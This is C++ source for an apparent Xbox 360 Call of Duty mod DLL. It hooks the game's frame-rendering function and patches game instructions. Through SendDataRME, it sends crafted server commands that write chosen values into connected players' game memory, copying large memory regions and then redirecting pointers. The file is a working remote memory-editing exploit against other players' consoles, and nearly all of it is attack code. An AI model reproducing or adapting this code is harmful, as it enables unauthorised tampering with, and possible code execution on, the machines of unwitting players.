#include <xtl.h>
#include <xboxmath.h>
#include <stdio.h>
#include <time.h>
#include <string>
#include <fstream>

/* Xbox SDK Local Headers */
#include "Kernel.h"
#include "utilites.h"
#include "Detours.h"

#include "Dvar.h"

Detour<void>R_EndFrameDetour;

typedef void(*SV_SendServerCommand_t)(int r3, int r4, char* r5, ...);

SV_SendServerCommand_t SV_SendServerCommand = SV_SendServerCommand_t(0x82433E78);
typedef char*(*va_t)(const char* fmt, ...);
va_t va = va_t(0x8249E440);
typedef dvar_s*(*Dvar_FindVar_t)(const char* dvar);
Dvar_FindVar_t Dvar_FindVar = Dvar_FindVar_t(0x82496430);

void*(*cbuff)(int client, const char* name) = (void*(*)(int, const char*))0x824015E0;

bool Dvar_GetBool(const char* dvarName)
{
	dvar_s* dvar_t = Dvar_FindVar(dvarName);
	if (!dvar_t)
		return false;
	return dvar_t->current.enabled;
}

void SendDataRME(int address, int value) {
	auto data = address - *(int*)0x82BBAE68;
	data /= 4;
	data += 0x5DDD;
	data -= 0x20000;
	SV_SendServerCommand(0, 1, "i %i %i", data, value);
}

#define Amb_Pointer 0x831EBEA8 
#define Dev_Pointer 0x831EBFD4
#define Rank_Pointer 0x831EBFD4
#define Shellshock 0x831EBFF8
#define Scoreboard 0x831EBFE0

#define AmbSize 0x30000
#define DevSize 0x1000
#define RankSize 0x19000 
#define ShellSize 0x1DEB0
#define ScoreSize 0x11A78

#define total 0x5D000

bool done, unload;
int shift, shifta, shiftb, shiftc, shiftd, nfile, test;

void R_EndFrame()
{
	R_EndFrameDetour.CallOriginal();
	
	if (!Dvar_GetBool("cl_ingame")) 
		return;

	if (!done)
	{
		SendDataRME(0xA5AD6340 + shift, *(int*)(0xA5AD6340 + shift)); //client
		SendDataRME(0xA5B19E00 + shifta, *(int*)(0xA5B19E00 + shifta)); //dev
		
	}
	if(shift < 0x30000){
		done = false;
	SV_SendServerCommand(0, 1, va("O \"^1<Client> <^6KatTan^1>^5%i/%i", shift, 0x30000));
	}
	if(shifta < 0x1000){
		done = false;
	SV_SendServerCommand(0, 1, va("O \"^1<Shellshock> <^6KatTan^1>^5%i/%i", shifta, 0x1000));
	}
		if(shift > 0x30000 && shifta > 0x1000){
						shift = 0x30000;
		                shifta = 0x1000;
		           

		                 done = true;
						
						 if (done) {

			SendDataRME(0x831EBEA8, 0xA5AD6340);
			SendDataRME(0x831EBFD4, 0xA5B19E00);

			

			SV_SendServerCommand(0, 1, va("O \"^6---^6---^5--\n^1--- ^5DONE ^1---\n^6---^6---^5--"));
			//cbuff(0, "gametype_setting timelimit 0");

			unload = true;
			if (unload)
				R_EndFrameDetour.TakeDownDetour();   
		
					}
				}
				
	else
	{
		shift += 4;
	    shifta += 4;
	
		}
	
}

bool WINAPI DllMain(HANDLE hInstDll, DWORD fdwReason, LPVOID lpReserved) {
	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:


		*(int*)0x828B9F64 = 0x60000000;
		*(int*)0x828B9F68 = 0x60000000;

		R_EndFrameDetour.SetupDetour(0x828B9F58, R_EndFrame);
	
		break;
	case DLL_PROCESS_DETACH:

		R_EndFrameDetour.TakeDownDetour();
		break;
	}
	return true;
}
